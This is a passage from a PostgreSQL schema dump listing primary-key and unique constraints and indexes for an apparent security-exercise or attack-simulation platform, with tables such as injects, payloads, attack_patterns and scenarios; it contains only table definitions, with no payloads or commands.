-- Name: documents_tags documents_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.documents_tags
    ADD CONSTRAINT documents_tags_pkey PRIMARY KEY (document_id, tag_id);


--
-- Name: evaluations evaluations_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.evaluations
    ADD CONSTRAINT evaluations_pkey PRIMARY KEY (evaluation_id);


--
-- Name: execution_traces execution_traces_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.execution_traces
    ADD CONSTRAINT execution_traces_pkey PRIMARY KEY (execution_trace_id);


--
-- Name: executors executor_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.executors
    ADD CONSTRAINT executor_pkey PRIMARY KEY (executor_id);


--
-- Name: exercises_documents exercises_documents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_documents
    ADD CONSTRAINT exercises_documents_pkey PRIMARY KEY (exercise_id, document_id);


--
-- Name: exercises exercises_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises
    ADD CONSTRAINT exercises_pkey PRIMARY KEY (exercise_id);


--
-- Name: exercises_tags exercises_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_tags
    ADD CONSTRAINT exercises_tags_pkey PRIMARY KEY (exercise_id, tag_id);


--
-- Name: exercises_teams exercises_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams
    ADD CONSTRAINT exercises_teams_pkey PRIMARY KEY (exercise_id, team_id);


--
-- Name: exercises_teams_users exercises_teams_users_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.exercises_teams_users
    ADD CONSTRAINT exercises_teams_users_pkey PRIMARY KEY (exercise_id, team_id, user_id);


--
-- Name: injects_expectations expectations_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations
    ADD CONSTRAINT expectations_pkey PRIMARY KEY (inject_expectation_id);


--
-- Name: findings_assets findings_assets_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_assets
    ADD CONSTRAINT findings_assets_pkey PRIMARY KEY (finding_id, asset_id);


--
-- Name: findings findings_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings
    ADD CONSTRAINT findings_pkey PRIMARY KEY (finding_id);


--
-- Name: findings_tags findings_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_tags
    ADD CONSTRAINT findings_tags_pkey PRIMARY KEY (finding_id, tag_id);


--
-- Name: findings_teams findings_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_teams
    ADD CONSTRAINT findings_teams_pkey PRIMARY KEY (finding_id, team_id);


--
-- Name: findings_users findings_users_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings_users
    ADD CONSTRAINT findings_users_pkey PRIMARY KEY (finding_id, user_id);


--
-- Name: grants grants_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.grants
    ADD CONSTRAINT grants_pkey PRIMARY KEY (grant_id);


--
-- Name: groups groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.groups
    ADD CONSTRAINT groups_pkey PRIMARY KEY (group_id);


--
-- Name: groups_roles groups_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.groups_roles
    ADD CONSTRAINT groups_roles_pkey PRIMARY KEY (role_id, group_id);


--
-- Name: import_mappers import_mappers_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.import_mappers
    ADD CONSTRAINT import_mappers_pkey PRIMARY KEY (mapper_id);


--
-- Name: indexing_status indexing_status_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.indexing_status
    ADD CONSTRAINT indexing_status_pkey PRIMARY KEY (indexing_status_type);


--
-- Name: inject_importers inject_importers_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.inject_importers
    ADD CONSTRAINT inject_importers_pkey PRIMARY KEY (importer_id);


--
-- Name: injects_tests_statuses inject_test_status_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_tests_statuses
    ADD CONSTRAINT inject_test_status_pkey PRIMARY KEY (status_id);


--
-- Name: injectors_contracts injector_contract_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts
    ADD CONSTRAINT injector_contract_pkey PRIMARY KEY (injector_contract_id);


--
-- Name: injectors injector_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors
    ADD CONSTRAINT injector_pkey PRIMARY KEY (injector_id);


--
-- Name: injectors_contracts_attack_patterns injectors_contracts_attack_patterns_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_attack_patterns
    ADD CONSTRAINT injectors_contracts_attack_patterns_pkey PRIMARY KEY (attack_pattern_id, injector_contract_id);


--
-- Name: injectors_contracts injectors_contracts_injector_contract_external_id_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts
    ADD CONSTRAINT injectors_contracts_injector_contract_external_id_key UNIQUE (injector_contract_external_id);


--
-- Name: injectors_contracts_vulnerabilities injectors_contracts_vulnerabilities_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injectors_contracts_vulnerabilities
    ADD CONSTRAINT injectors_contracts_vulnerabilities_pkey PRIMARY KEY (injector_contract_id, vulnerability_id);


--
-- Name: injects_asset_groups injects_asset_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_asset_groups
    ADD CONSTRAINT injects_asset_groups_pkey PRIMARY KEY (inject_id, asset_group_id);


--
-- Name: injects_assets injects_assets_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_assets
    ADD CONSTRAINT injects_assets_pkey PRIMARY KEY (inject_id, asset_id);


--
-- Name: injects_dependencies injects_dependencies_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_dependencies
    ADD CONSTRAINT injects_dependencies_pkey PRIMARY KEY (inject_parent_id, inject_children_id);


--
-- Name: injects_documents injects_documents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_documents
    ADD CONSTRAINT injects_documents_pkey PRIMARY KEY (inject_id, document_id);


--
-- Name: injects_expectations_traces injects_expectations_traces_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations_traces
    ADD CONSTRAINT injects_expectations_traces_pkey PRIMARY KEY (inject_expectation_trace_id);


--
-- Name: injects injects_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects
    ADD CONSTRAINT injects_pkey PRIMARY KEY (inject_id);


--
-- Name: injects_statuses injects_statuses_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_statuses
    ADD CONSTRAINT injects_statuses_pkey PRIMARY KEY (status_id);


--
-- Name: injects_tags injects_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_tags
    ADD CONSTRAINT injects_tags_pkey PRIMARY KEY (inject_id, tag_id);


--
-- Name: injects_teams injects_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_teams
    ADD CONSTRAINT injects_teams_pkey PRIMARY KEY (inject_id, team_id);


--
-- Name: kill_chain_phases kill_chain_phases_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.kill_chain_phases
    ADD CONSTRAINT kill_chain_phases_pkey PRIMARY KEY (phase_id);


--
-- Name: lessons_answers lessons_answers_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_answers
    ADD CONSTRAINT lessons_answers_pkey PRIMARY KEY (lessons_answer_id);


--
-- Name: lessons_categories lessons_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories
    ADD CONSTRAINT lessons_categories_pkey PRIMARY KEY (lessons_category_id);


--
-- Name: lessons_categories_teams lessons_categories_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_categories_teams
    ADD CONSTRAINT lessons_categories_teams_pkey PRIMARY KEY (team_id, lessons_category_id);


--
-- Name: lessons_questions lessons_questions_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_questions
    ADD CONSTRAINT lessons_questions_pkey PRIMARY KEY (lessons_question_id);


--
-- Name: lessons_template_categories lessons_template_categories_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_template_categories
    ADD CONSTRAINT lessons_template_categories_pkey PRIMARY KEY (lessons_template_category_id);


--
-- Name: lessons_template_questions lessons_template_questions_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_template_questions
    ADD CONSTRAINT lessons_template_questions_pkey PRIMARY KEY (lessons_template_question_id);


--
-- Name: lessons_templates lessons_templates_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.lessons_templates
    ADD CONSTRAINT lessons_templates_pkey PRIMARY KEY (lessons_template_id);


--
-- Name: logs logs_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs
    ADD CONSTRAINT logs_pkey PRIMARY KEY (log_id);


--
-- Name: logs_tags logs_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.logs_tags
    ADD CONSTRAINT logs_tags_pkey PRIMARY KEY (log_id, tag_id);


--
-- Name: migrations migrations_pk; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.migrations
    ADD CONSTRAINT migrations_pk PRIMARY KEY (installed_rank);


--
-- Name: mitigations_attack_patterns mitigations_attack_patterns_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.mitigations_attack_patterns
    ADD CONSTRAINT mitigations_attack_patterns_pkey PRIMARY KEY (mitigation_id, attack_pattern_id);


--
-- Name: mitigations mitigations_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.mitigations
    ADD CONSTRAINT mitigations_pkey PRIMARY KEY (mitigation_id);


--
-- Name: notification_rules notification_rules_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.notification_rules
    ADD CONSTRAINT notification_rules_pkey PRIMARY KEY (notification_rule_id);


--
-- Name: objectives objectives_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.objectives
    ADD CONSTRAINT objectives_pkey PRIMARY KEY (objective_id);


--
-- Name: organizations organizations_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.organizations
    ADD CONSTRAINT organizations_pkey PRIMARY KEY (organization_id);


--
-- Name: organizations_tags organizations_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.organizations_tags
    ADD CONSTRAINT organizations_tags_pkey PRIMARY KEY (organization_id, tag_id);


--
-- Name: output_parsers output_parsers_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.output_parsers
    ADD CONSTRAINT output_parsers_pkey PRIMARY KEY (output_parser_id);


--
-- Name: parameters parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.parameters
    ADD CONSTRAINT parameters_pkey PRIMARY KEY (parameter_id);


--
-- Name: pauses pauses_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.pauses
    ADD CONSTRAINT pauses_pkey PRIMARY KEY (pause_id);


--
-- Name: payloads_attack_patterns payloads_attack_patterns_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_attack_patterns
    ADD CONSTRAINT payloads_attack_patterns_pkey PRIMARY KEY (attack_pattern_id, payload_id);


--
-- Name: payloads payloads_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads
    ADD CONSTRAINT payloads_pkey PRIMARY KEY (payload_id);


--
-- Name: payloads_tags payloads_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.payloads_tags
    ADD CONSTRAINT payloads_tags_pkey PRIMARY KEY (payload_id, tag_id);


--
-- Name: challenge_attempts pk_challenge_attempts; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenge_attempts
    ADD CONSTRAINT pk_challenge_attempts PRIMARY KEY (challenge_id, inject_status_id, user_id);


--
-- Name: articles pkey_articles; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT pkey_articles PRIMARY KEY (article_id);


--
-- Name: articles_documents pkey_articles_documents; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.articles_documents
    ADD CONSTRAINT pkey_articles_documents PRIMARY KEY (article_id, document_id);


--
-- Name: attack_patterns pkey_attack_patterns; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.attack_patterns
    ADD CONSTRAINT pkey_attack_patterns PRIMARY KEY (attack_pattern_id);


--
-- Name: attack_patterns_kill_chain_phases pkey_attack_patterns_kill_chain_phases; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.attack_patterns_kill_chain_phases
    ADD CONSTRAINT pkey_attack_patterns_kill_chain_phases PRIMARY KEY (attack_pattern_id, phase_id);


--
-- Name: regex_groups regex_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.regex_groups
    ADD CONSTRAINT regex_groups_pkey PRIMARY KEY (regex_group_id);


--
-- Name: report_informations report_informations_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_informations
    ADD CONSTRAINT report_informations_pkey PRIMARY KEY (report_informations_id);


--
-- Name: report_informations report_informations_report_id_report_informations_type_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_informations
    ADD CONSTRAINT report_informations_report_id_report_informations_type_key UNIQUE (report_id, report_informations_type);


--
-- Name: report_inject_comment report_inject_comment_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.report_inject_comment
    ADD CONSTRAINT report_inject_comment_pkey PRIMARY KEY (report_id, inject_id);


--
-- Name: reports_exercises reports_exercises_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.reports_exercises
    ADD CONSTRAINT reports_exercises_pkey PRIMARY KEY (report_id, exercise_id);


--
-- Name: reports reports_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.reports
    ADD CONSTRAINT reports_pkey PRIMARY KEY (report_id);


--
-- Name: roles_capabilities roles_capabilities_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.roles_capabilities
    ADD CONSTRAINT roles_capabilities_pkey PRIMARY KEY (role_id, capability);


--
-- Name: roles roles_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.roles
    ADD CONSTRAINT roles_pkey PRIMARY KEY (role_id);


--
-- Name: rule_attributes rule_attributes_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.rule_attributes
    ADD CONSTRAINT rule_attributes_pkey PRIMARY KEY (attribute_id);


--
-- Name: scenarios_exercises scenario_exercise_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_exercises
    ADD CONSTRAINT scenario_exercise_pkey PRIMARY KEY (scenario_id, exercise_id);


--
-- Name: scenarios_documents scenarios_documents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_documents
    ADD CONSTRAINT scenarios_documents_pkey PRIMARY KEY (scenario_id, document_id);


--
-- Name: scenarios scenarios_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios
    ADD CONSTRAINT scenarios_pkey PRIMARY KEY (scenario_id);


--
-- Name: scenarios_tags scenarios_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_tags
    ADD CONSTRAINT scenarios_tags_pkey PRIMARY KEY (scenario_id, tag_id);


--
-- Name: scenarios_teams scenarios_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams
    ADD CONSTRAINT scenarios_teams_pkey PRIMARY KEY (scenario_id, team_id);


--
-- Name: scenarios_teams_users scenarios_teams_users_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.scenarios_teams_users
    ADD CONSTRAINT scenarios_teams_users_pkey PRIMARY KEY (scenario_id, team_id, user_id);


--
-- Name: security_coverages security_coverage_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.security_coverages
    ADD CONSTRAINT security_coverage_pkey PRIMARY KEY (security_coverage_id);


--
-- Name: security_coverage_send_job security_coverage_send_job_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.security_coverage_send_job
    ADD CONSTRAINT security_coverage_send_job_pkey PRIMARY KEY (security_coverage_send_job_id);


--
-- Name: security_coverage_send_job security_coverage_send_job_security_coverage_send_job_simul_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.security_coverage_send_job
    ADD CONSTRAINT security_coverage_send_job_security_coverage_send_job_simul_key UNIQUE (security_coverage_send_job_simulation);


--
-- Name: tag_rule_asset_groups tag_rule_asset_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tag_rule_asset_groups
    ADD CONSTRAINT tag_rule_asset_groups_pkey PRIMARY KEY (tag_rule_id, asset_group_id);


--
-- Name: tag_rules tag_rules_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tag_rules
    ADD CONSTRAINT tag_rules_pkey PRIMARY KEY (tag_rule_id);


--
-- Name: tags tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tags
    ADD CONSTRAINT tags_pkey PRIMARY KEY (tag_id);


--
-- Name: teams teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.teams
    ADD CONSTRAINT teams_pkey PRIMARY KEY (team_id);


--
-- Name: teams_tags teams_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.teams_tags
    ADD CONSTRAINT teams_tags_pkey PRIMARY KEY (team_id, tag_id);


--
-- Name: tokens tokens_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.tokens
    ADD CONSTRAINT tokens_pkey PRIMARY KEY (token_id);


--
-- Name: findings unique_finding_constraint; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.findings
    ADD CONSTRAINT unique_finding_constraint UNIQUE (finding_inject_id, finding_type, finding_value, finding_field);


--
-- Name: injects_expectations_traces unique_injects_expectations_traces_constraint; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.injects_expectations_traces
    ADD CONSTRAINT unique_injects_expectations_traces_constraint UNIQUE (inject_expectation_trace_expectation, inject_expectation_trace_source_id, inject_expectation_trace_alert_link, inject_expectation_trace_alert_name);


--
-- Name: notification_rules uq_notification_rule; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.notification_rules
    ADD CONSTRAINT uq_notification_rule UNIQUE (notification_resource_id, notification_rule_trigger, user_id, notification_rule_type);


--
-- Name: users_groups users_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_groups
    ADD CONSTRAINT users_groups_pkey PRIMARY KEY (group_id, user_id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (user_id);


--
-- Name: users_tags users_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_tags
    ADD CONSTRAINT users_tags_pkey PRIMARY KEY (user_id, tag_id);


--
-- Name: users_teams users_teams_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.users_teams
    ADD CONSTRAINT users_teams_pkey PRIMARY KEY (team_id, user_id);


--
-- Name: variables variables_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.variables
    ADD CONSTRAINT variables_pkey PRIMARY KEY (variable_id);


--
-- Name: widgets widgets_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.widgets
    ADD CONSTRAINT widgets_pkey PRIMARY KEY (widget_id);


--
-- Name: assets_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX assets_unique ON public.assets USING btree (asset_external_reference);


--
-- Name: collectors_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX collectors_unique ON public.collectors USING btree (collector_type);


--
-- Name: executors_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX executors_unique ON public.executors USING btree (executor_type);


--
-- Name: grant_resource_unique; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX grant_resource_unique ON public.grants USING btree (grant_group, grant_resource, grant_name);


--
-- Name: idx_64adc7d620b0bd5e; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_64adc7d620b0bd5e ON public.grants USING btree (grant_group);


--
-- Name: idx_6cb0696c157d9150; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_6cb0696c157d9150 ON public.objectives USING btree (objective_exercise);


--
-- Name: idx_96e1b96c7983aee; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_96e1b96c7983aee ON public.injects_teams USING btree (inject_id);


--
-- Name: idx_96e1b96ccb0ca5a3; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_96e1b96ccb0ca5a3 ON public.injects_teams USING btree (team_id);


--
-- Name: idx_a25f787295a4a46f; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_a25f787295a4a46f ON public.comchecks_statuses USING btree (status_comcheck);


--
-- Name: idx_a25f7872b5957bdd; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_a25f7872b5957bdd ON public.comchecks_statuses USING btree (status_user);


--
-- Name: idx_a60839b2e20fc097; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_a60839b2e20fc097 ON public.injects USING btree (inject_user);


--
-- Name: idx_aa5a118eef97e32b; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_aa5a118eef97e32b ON public.tokens USING btree (token_user);


--
-- Name: idx_agent_assets; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_agent_assets ON public.agents USING btree (agent_asset);


--
-- Name: idx_articles_channel_exercise; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_articles_channel_exercise ON public.articles USING btree (article_channel, article_exercise);


--
-- Name: idx_articles_documents_article; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_articles_documents_article ON public.articles_documents USING btree (article_id);


--
-- Name: idx_articles_documents_document; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_articles_documents_document ON public.articles_documents USING btree (document_id);


--
-- Name: idx_articles_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_articles_id ON public.articles USING btree (article_id);


--
-- Name: idx_asset_agent_jobs; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_asset_agent_jobs ON public.asset_agent_jobs USING btree (asset_agent_id);


--
-- Name: idx_asset_groups; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_asset_groups ON public.asset_groups USING btree (asset_group_id);


--
-- Name: idx_asset_groups_assets_asset; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_asset_groups_assets_asset ON public.asset_groups_assets USING btree (asset_id);


--
-- Name: idx_asset_groups_assets_asset_group; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_asset_groups_assets_asset_group ON public.asset_groups_assets USING btree (asset_group_id);


--
-- Name: idx_assets; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_assets ON public.assets USING btree (asset_id);


--
-- Name: idx_assets_tags_asset; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_assets_tags_asset ON public.assets_tags USING btree (asset_id);


--
-- Name: idx_assets_tags_tag; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_assets_tags_tag ON public.assets_tags USING btree (tag_id);


--
-- Name: idx_attack_patterns; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_attack_patterns ON public.attack_patterns USING btree (attack_pattern_id);


--
-- Name: idx_attack_patterns_external_id; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX idx_attack_patterns_external_id ON public.attack_patterns USING btree (attack_pattern_external_id);


--
-- Name: idx_attack_patterns_kill_chain_phases_attack_pattern; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_attack_patterns_kill_chain_phases_attack_pattern ON public.attack_patterns_kill_chain_phases USING btree (attack_pattern_id);


--
-- Name: idx_attack_patterns_kill_chain_phases_kill_chain_phase; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_attack_patterns_kill_chain_phases_kill_chain_phase ON public.attack_patterns_kill_chain_phases USING btree (phase_id);


--
-- Name: idx_attack_patterns_stix_id; Type: INDEX; Schema: public; Owner: user
--

CREATE UNIQUE INDEX idx_attack_patterns_stix_id ON public.attack_patterns USING btree (attack_pattern_stix_id);


--
-- Name: idx_challenge_attempt_challenge_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenge_attempt_challenge_id ON public.challenge_attempts USING btree (challenge_id);


--
-- Name: idx_challenge_attempt_inject_status_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenge_attempt_inject_status_id ON public.challenge_attempts USING btree (inject_status_id);


--
-- Name: idx_challenge_attempt_user_id; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenge_attempt_user_id ON public.challenge_attempts USING btree (user_id);


--
-- Name: idx_challenge_documents_challenge; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenge_documents_challenge ON public.challenges_documents USING btree (challenge_id);


--
-- Name: idx_challenge_documents_document; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenge_documents_document ON public.challenges_documents USING btree (document_id);


--
-- Name: idx_challenges; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenges ON public.challenges USING btree (challenge_id);


--
-- Name: idx_challenges_flags; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_challenges_flags ON public.challenges_flags USING btree (flag_id);


--
-- Name: idx_channels; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_channels ON public.channels USING btree (channel_id);


--
-- Name: idx_collectors; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_collectors ON public.collectors USING btree (collector_id);


--
-- Name: idx_comchecks; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_comchecks ON public.comchecks USING btree (comcheck_exercise);


--
-- Name: idx_communication_subject; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_communication_subject ON public.communications USING btree (communication_subject);


--
-- Name: idx_communications; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_communications ON public.communications USING btree (communication_id);


--
-- Name: idx_communications_users_communication; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_communications_users_communication ON public.communications_users USING btree (communication_id);


--
-- Name: idx_communications_users_user; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_communications_users_user ON public.communications_users USING btree (user_id);


--
-- Name: idx_contract_output_elements_tags_contract_output_elements; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_contract_output_elements_tags_contract_output_elements ON public.contract_output_elements_tags USING btree (contract_output_element_id);


--
-- Name: idx_contract_output_elements_tags_tag; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_contract_output_elements_tags_tag ON public.contract_output_elements_tags USING btree (tag_id);


--
-- Name: idx_custom_dashboards_parameters; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_custom_dashboards_parameters ON public.custom_dashboards_parameters USING btree (custom_dashboards_parameter_id);


--
-- Name: idx_detection_remediation_collector_type; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_detection_remediation_collector_type ON public.detection_remediations USING btree (detection_remediation_collector_type);


--
-- Name: idx_detection_remediation_payload; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_detection_remediation_payload ON public.detection_remediations USING btree (detection_remediation_payload_id);


--
-- Name: idx_evaluations; Type: INDEX; Schema: public; Owner: user
--

CREATE INDEX idx_evaluations ON public.evaluations USING btree (evaluation_id);


--
-- Name: idx_executors; Type: INDEX; Schema: public; Owner: user
--

